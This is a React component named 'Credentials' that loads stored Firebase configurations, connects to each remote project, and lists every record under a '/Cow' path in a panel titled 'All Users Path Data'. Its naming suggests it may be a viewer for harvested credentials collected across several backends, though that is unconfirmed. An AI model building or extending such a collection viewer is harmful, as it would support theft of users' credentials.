import React, { useEffect, useState } from "react";
import { db } from "../utils/firebase";
import { ref, get, getDatabase } from "firebase/database";
import { initializeApp, getApps, deleteApp } from "firebase/app";

const Credentials = () => {
  const [allCowData, setAllCowData] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchAllCowData = async () => {
      try {
        setLoading(true);
        setError(null);

        const configsSnapshot = await get(ref(db, "firebaseConfigs"));
        const configs = configsSnapshot.val() || {};

        let combinedCowData = [];

        for (const key in configs) {
          let config = configs[key];

          if (typeof config === "string") {
            try {
              config = JSON.parse(config);
            } catch (e) {
              console.warn(`Skipping config ${key} due to JSON parse error:`, e.message);
              continue;
            }
          }

          if (!config.databaseURL) {
            console.warn(`Skipping config ${key} as no databaseURL found.`);
            continue;
          }

          const appName = `cowApp-${key}`;
          const existingApp = getApps().find((app) => app.name === appName);
          if (existingApp) {
            await deleteApp(existingApp);
          }

          try {
            const remoteApp = initializeApp(config, appName);
            const remoteDb = getDatabase(remoteApp);
            const cowSnapshot = await get(ref(remoteDb, "Cow"));
            const cowData = cowSnapshot.val();

            if (cowData) {
              const entries = Object.entries(cowData).map(([entryId, entryVal]) => ({
                id: entryId,
                ...entryVal,
                _projectId: config.projectId || key,
              }));
              combinedCowData = combinedCowData.concat(entries);
            }
            await deleteApp(remoteApp);
          } catch (remoteErr) {
            console.warn(
              `Error fetching Cow data from ${config.databaseURL}:`,
              remoteErr.message || remoteErr
            );
          }
        }

        combinedCowData.sort((a, b) => {
          const tsA = Number(a.timestamp) || 0;
          const tsB = Number(b.timestamp) || 0;
          return tsB - tsA;
        });

        setAllCowData(combinedCowData);
      } catch (err) {
        console.error("Error fetching all Cow data:", err);
        setError(err);
      } finally {
        setLoading(false);
      }
    };

    fetchAllCowData();

    return () => {
      getApps().forEach((app) => {
        if (app.name.startsWith("cowApp-")) {
          deleteApp(app).catch((e) => console.error("Error deleting temp app:", e));
        }
      });
    };
  }, []);

  const formatDate = (ms) => {
    const date = new Date(Number(ms));
    return isNaN(date.getTime()) ? "Invalid Date" : date.toLocaleString();
  };

  if (loading)
    return (
      <div className="flex items-center justify-center min-h-screen">
        Loading User data...
      </div>
    );

  if (error)
    return (
      <div className="flex items-center justify-center min-h-screen text-red-600">
        Error: {error.message}
      </div>
    );

  return (
    <div className="min-h-screen bg-gray-100 p-8">
      <div className="max-w-5xl mx-auto bg-white p-6 rounded-lg shadow-md">
        <h2 className="text-2xl font-bold mb-6 text-center">All Users Path Data</h2>

        {allCowData.length === 0 ? (
          <p className="text-center text-gray-600">
            No data found at /Cow path in any Firebase database.
          </p>
        ) : (
          <div className="space-y-4 max-h-[80vh] overflow-auto">
            {allCowData.map((dataEntry) => (
              <div
                key={`${dataEntry._projectId}-${dataEntry.id}`}
                className="border border-gray-300 rounded-lg p-4 bg-gray-50 shadow-sm"
              >
                <p className="text-xs text-gray-500 mb-2">
                  <strong>Project:</strong> {dataEntry._projectId}
                </p>

                <p className="text-sm font-medium mb-1">Entry ID: {dataEntry.id}</p>
                {dataEntry.timestamp && (
                  <p className="text-sm text-gray-600 mb-2">
                    <strong>Timestamp:</strong> {formatDate(dataEntry.timestamp)}
                  </p>
                )}

                <ul className="text-sm text-gray-700 list-disc list-inside">
                  {Object.entries(dataEntry).map(([key, value]) => {
                    if (key.startsWith("_") || key === "id" || key === "timestamp") return null;
                    return (
                      <li key={key}>
                        <strong>{key}:</strong>{" "}
                        {typeof value === "object"
                          ? JSON.stringify(value, null, 2)
                          : String(value)}
                      </li>
                    );
                  })}
                </ul>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default Credentials;
